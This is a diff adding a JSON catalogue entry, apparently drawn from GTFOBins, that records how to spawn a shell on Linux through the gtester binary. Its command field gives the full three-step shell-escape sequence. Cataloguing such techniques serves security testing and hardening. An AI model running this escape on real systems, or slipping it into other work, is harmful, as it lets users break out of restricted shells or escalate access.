@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-gtester-shell",
+  "name": "GTFOBins · gtester (shell)",
+  "command": "echo 'exec /bin/sh 0<&1' >/path/to/temp-file\nchmod +x /path/to/temp-file\ngtester -q /path/to/temp-file",
+  "description": "Use gtester to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "gtester",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/gtester/#shell",
+  "upstream_id": "gtester/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/gtester/"
+    }
+  ]
+}
